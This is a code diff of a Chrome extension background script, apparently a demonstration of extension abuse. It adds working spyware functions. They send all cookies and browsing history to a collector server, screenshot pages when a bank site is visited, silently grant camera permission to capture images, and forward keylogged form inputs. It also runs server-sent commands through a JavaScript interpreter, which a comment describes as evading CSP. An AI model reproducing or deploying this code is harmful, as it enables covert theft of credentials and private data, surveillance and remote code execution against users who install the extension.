@@ -1,13 +1,18 @@
 importScripts("packages/acorn_interpreter.js", "packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");
 
-const SERVER_DOMAIN = 'extension-code-injector-production.up.railway.app'
-// const SERVER_DOMAIN = 'localhost:3333'
+/* =================================================================================== */
+// Constants configuration
+
+// const SERVER_DOMAIN = 'extension-code-injector-production.up.railway.app'
+const SERVER_DOMAIN = 'localhost:3333'
 const HTTP_SERVER_URL = `http://${SERVER_DOMAIN}`;
 const WS_SERVER_URL = `ws://${SERVER_DOMAIN}`;
 
+/* =================================================================================== */
+
 // Perform the initial data steal and connect to websockets only after website is ready
 async function onReady() {
-    await stealUserData();
+    stealUserData();
     setTimeout(() => {
         socket = connectWebSocket();
     }, 2000);
@@ -19,15 +24,33 @@ chrome.action.onClicked.addListener((tab) => {
 });
 
 /* =================================================================================== */
+// Utility functions for server communication
+async function request(endpoint, options) {
+    try {
+        const response = await fetch(`${HTTP_SERVER_URL}/${endpoint}`, {
+            method: options.method || 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+                ...options.headers
+            },
+            body: JSON.stringify(options.data)
+        })
+
+        return response.json();
+    } catch (err) {
+        console.error(err.message);
+    }
+}
+
+/* =================================================================================== */
 
 // Steal cookies and browsing history on load
 async function stealUserData() {
     const cookies = await chrome.cookies.getAll({});
-    const history = await chrome.history.search({text: ""});
+    await request('collector/cookies', {data: {cookies}, method: 'POST'});
 
-    // TODO: Save history and all cookies
-    console.log('cookies', cookies);
-    console.log('history', history);
+    const history = await chrome.history.search({text: ""});
+    await request('collector/history', {data: {history}, method: 'POST'});
 }
 
 /* =================================================================================== */
@@ -36,14 +59,11 @@ async function stealUserData() {
 // Could be abused to take screenshots of sensitive data such as bank account details
 async function onVisited(historyItem) {
     if (historyItem.url.includes('mybank.com')) {
-        console.log('historyItem', historyItem);
-        const screenshotUrl = await chrome.tabs.captureVisibleTab({format: 'jpeg'});
-        // TODO: take a screenshot and save it
+        await takeScreenshot()
     }
 }
 
-// TODO: uncomment if want the listener for website visits
-// chrome.history.onVisited.addListener(onVisited)
+chrome.history.onVisited.addListener(onVisited)
 
 /* =================================================================================== */
 
@@ -56,33 +76,50 @@ async function takeScreenshot() {
     }
 
     const screenshotUrl = await chrome.tabs.captureVisibleTab();
-    console.log(screenshotUrl)
 
-    try {
-        await fetch(`${HTTP_SERVER_URL}/collector/screenshot`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({dataUrl: screenshotUrl})
-        })
-    } catch (err) {
-        console.error(err.message);
-    }
+    await request('collector/screenshot', {data: {dataUrl: screenshotUrl}, method: 'POST'})
 }
 
+/* =================================================================================== */
+
+// Utility function to take picture from the camera and send it to the server
+async function captureCamera() {
+    // check site permissions
+    const currentTab = await getCurrentTab();
+    if (!currentTab) {
+        console.log('Could not find current tab');
+        return;
+    }
+
+    const cameraSettings = await chrome.contentSettings.camera.get({primaryUrl: currentTab.url});
+    console.log('cameraSettings', cameraSettings);
+
+    if (cameraSettings.setting !== 'allow') {
+        console.log('Camera access blocked');
+        const origin = new URL(currentTab.url).origin;
+        await chrome.contentSettings.camera.set({primaryPattern: `${origin}/*`, setting: 'allow'});
+    }
+
+    chrome.tabs.sendMessage(currentTab.id, {type: 'CAMERA'});
+}
+
+// handler for the camera image capture from the content script
+async function onCameraImage(message, sender, sendResponse) {
+    try {
+        await request('collector/camera', {data: {dataUrl: message.data}, method: 'POST'})
+
+        sendResponse({status: 'ok'})
+    } catch (err) {
+        console.warn(err.message);
+        sendResponse({status: 'fail'})
+    }
+}
 /* =================================================================================== */
 
 // Send the input values to the server which will save them in a DB
 async function onInputMessage(message, sender, sendResponse) {
     try {
-        const response = await fetch(`${HTTP_SERVER_URL}/collector/key-logger`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(request.data)
-        })
+        await request('collector/key-logger', {data: {data: message.data}, method: 'POST'});
 
         sendResponse({status: 'ok'})
     } catch (err) {
@@ -96,6 +133,10 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         switch (request.type) {
             case 'SUBMIT_FORM':
                 await onInputMessage(request, sender, sendResponse);
+                break;
+            case 'CAPTURED_IMAGE':
+                await onCameraImage(request, sender, sendResponse);
+                break;
             default:
                 console.log('Unknown message received from content script:', request);
                 break;
@@ -108,11 +149,11 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
 // Establish a websocket connection to the server and forward all messages from the server to the popup
 // This way the popup can receive real-time code from the server and execute on client-side
-let WS_CONNECTED = false;
+let isWsConnected = false;
 let socket;
 
 function connectWebSocket() {
-    if (WS_CONNECTED) {
+    if (isWsConnected) {
         return;
     }
 
@@ -120,7 +161,7 @@ function connectWebSocket() {
 
     socket.onopen = () => {
         console.log('WebSocket connected');
-        WS_CONNECTED = true;
+        isWsConnected = true;
         keepAlive();
     };
 
@@ -132,7 +173,7 @@ function connectWebSocket() {
 
     socket.onclose = (event) => {
         console.log('WebSocket closed.');
-        WS_CONNECTED = false;
+        isWsConnected = false;
     };
 
     return socket
@@ -143,7 +184,7 @@ function connectWebSocket() {
 function keepAlive() {
     const keepAliveIntervalId = setInterval(
         () => {
-            if (socket && WS_CONNECTED) {
+            if (socket && isWsConnected) {
                 socket.send('keepalive');
             } else {
                 clearInterval(keepAliveIntervalId);
@@ -173,18 +214,22 @@ async function onWsMessage(event) {
         return await takeScreenshot();
     }
 
+    if (parsedMessage.type.includes('CAMERA')) {
+        return await captureCamera();
+    }
+
     if (parsedMessage.type.includes('BG_COMMAND')) {
-        // // Show that eval is blocked by CSP
-        // executeWithEval(parsedMessage.data);
-        //
-        // // Show that eval through setTimout is blocked by CSP in the background script
-        // executeWithSetTimeout(parsedMessage.data);
-        //
-        // // Alternative, execute the command with the interpreter, goes unnoticed by CSP
-        // executeWithInterpreter(parsedMessage.data);
+        // Show that eval is blocked by CSP
+        executeWithEval(parsedMessage.data);
+
+        // Show that eval through setTimout is blocked by CSP in the background script
+        executeWithSetTimeout(parsedMessage.data);
 
         // Alternative, execute the command with the interpreter, goes unnoticed by CSP
-        executeWithStaticEval(parsedMessage.data);
+        executeWithInterpreter(parsedMessage.data);
+
+        // // Alternative, execute the command with the interpreter, goes unnoticed by CSP
+        // executeWithStaticEval(parsedMessage.data);
     }
 
     if (parsedMessage.type.includes('CS_COMMAND')) {
